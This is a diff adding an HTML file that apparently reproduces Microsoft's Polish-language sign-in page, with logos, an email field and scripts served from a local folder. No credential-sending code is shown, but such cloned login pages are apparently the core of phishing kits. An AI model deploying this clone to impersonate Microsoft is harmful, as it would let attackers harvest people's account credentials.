@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="pl-PL"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>Sign in</title>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=10">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="hrd_data/hrd.css">
+    <!--[if IE 8]><script src="https://cdn.odc.officeapps.live.com/odc/stat/html5shiv.min.js?b=14930.30550"></script><![endif]-->
+</head>
+<body>
+    <div class="background">
+        <div class="blur"></div>
+        <div class="full"></div>
+    </div>
+    <div class="outer">
+        <div class="middle">
+            <main class="inner" style="">
+                <div class="margin-bottom-20" aria-hidden="true">
+                    <picture class="logo margin-bottom-16">
+                        <source srcset="hrd_data/microsoft_logo.svg 1x">
+                        <img src="hrd_data/microsoft_logo.png" alt="Logo firmy Microsoft" data-bind="attr: {alt: config.text.microsoftLogo}">
+                    </picture>
+                </div>
+                
+                <!-- ko ifnot: showSplitter -->
+                <div>
+                    <h1 class="row text-title margin-bottom-16" data-bind="text: config.text.header">Zaloguj</h1>
+                    <!-- ko if: context --><!-- /ko -->
+                    <div class="alert alert-error text-body margin-bottom-12 col-md-12" role="alert" aria-live="assertive" aria-atomic="true" data-bind="html: error"></div>
+                    <div class="row margin-bottom-16">
+                        <div class="form-group col-md-12 placeholderContainer">
+                            <input type="email" class="form-control" placeholder="Adres e-mail, telefon lub konto Skype" aria-required="true" spellcheck="false" autocomplete="off" data-bind="
+                                    hasFocus: focus,
+                                    textInput: email,
+                                    attr: {'placeholder': config.text.emailPlaceHolder, 'aria-invalid': !error}">
+                            <!-- ko if: isRequestPending --><!-- /ko -->
+                            <!-- ko if: showPlaceholder --><!-- /ko -->
+                        </div>
+                    </div>
+                    <!-- ko if: showEnterProductKey --><!-- /ko -->
+                    <!-- ko if: showCreateAccount -->
+                    <div class="row margin-bottom-20">
+                        <div class="col-md-12 section text-secondary">
+                            <span data-bind="text: config.text.noAccount" aria-hidden="true">Nie masz konta?</span>
+                            <a href="#" aria-label="Utwórz konto Microsoft" data-bind="text: config.text.createAccount,
+                                attr: {'aria-label': config.text.createAccountAria}, click: msAccountSignUp">Utwórz konto!</a>
+                        </div>
+                    </div>
+                    <!-- /ko -->
+                    <div class="row inline-block no-margin-top-bottom button-container">
+                        <input type="submit" class="btn btn-block btn-primary" data-bind="value: config.text.linkNext, click: submit" value="Dalej">
+                    </div>
+                </div>
+                <!-- /ko -->
+                
+                <!-- ko if: showSplitter --><!-- /ko -->
+            </main>
+        </div>
+    </div>
+    <footer id="footer">
+        <div>
+            <div class="footerNode">
+                <span>©2022 Microsoft</span>
+                <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Oświadczenie o ochronie prywatności</a>
+            </div>
+        </div>
+    </footer>
+    <noscript>
+        Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br />
+        <br />
+        To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.
+    </noscript>
+    <script src="hrd_data/jquery-1.js"></script>
+    <script src="hrd_data/knockout-3.js"></script>
+    <script src="hrd_data/CommonDiagnostics.js"></script>
+    <script src="hrd_data/jsonstrings"></script>
+    <script src="hrd_data/hrd.js"></script>
+    <script>
+		var EmailHrdPage = new Hrd({"correlationId":"01cbab8c-8990-42d4-a60d-0bd2150a99a0","params":{"accelerated":false,"app":3,"minimalEmailValidation":false,"culture":"pl-PL","dir":"ltr","focus":true,"fpEnabled":true,"hm":0,"hostInterface":1,"idp":"","path":"/odc/v2.0/hrd","ver":16},"services":{"getIdpUrl":"/odc/emailhrd/getidp","getIdpTimeout":20000,"getFederationProviderUrl":"/odc/emailhrd/getfederationprovider","getFederationProviderTimeOut":20000},"text":"","links":{"renameYourAccount":"https://go.microsoft.com/fwlink/?LinkID=733247","privacyAndCookies":"https://go.microsoft.com/fwlink/?LinkId=521839","termsOfUse":"https://go.microsoft.com/fwlink/?LinkId=521839"}}, OOUI);
+    </script>
+
+
+</body></html>
